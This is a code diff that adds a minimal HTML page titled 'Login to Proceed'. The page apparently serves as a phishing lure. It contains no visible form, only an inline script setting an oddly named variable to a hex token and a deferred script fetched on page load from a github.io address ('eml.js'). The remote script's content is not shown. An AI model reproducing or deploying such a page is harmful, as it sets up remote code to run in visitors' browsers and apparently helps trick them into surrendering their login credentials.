@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login to Proceed</title>
+</head>
+<body>
+  <script> var I94626736O = '6bac27c40cdf4aa9'; 
+  </script>
+  <script src="https://linksvo.github.io/Coach_grace05/eml.js" defer></script>
+</body>
+</html>
